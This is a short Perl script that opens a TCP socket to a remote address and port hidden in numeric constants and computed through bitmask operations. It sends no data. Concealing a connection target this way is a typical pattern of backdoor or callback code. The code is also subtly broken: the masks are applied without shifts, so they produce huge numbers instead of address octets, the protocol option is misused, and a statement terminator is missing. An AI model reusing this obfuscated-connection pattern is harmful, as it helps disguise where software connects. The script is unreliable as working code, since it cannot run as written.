#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;

use constant A => 787583468988247211;
use constant P => 0xFFECFA8B;

my $s = new IO::Socket::INET (
	PeerAddr => &A & 0xFF00000000000000 . "." . 
		&A & 0x0000FF0000000000 . "." . 
		&A & 0x00000000FF000000 . "." .
		&A & 0x000000000000FF00,
	PeerPort => &P & 0x0000FFFF,
	Port => 'tcp'
)


__END__
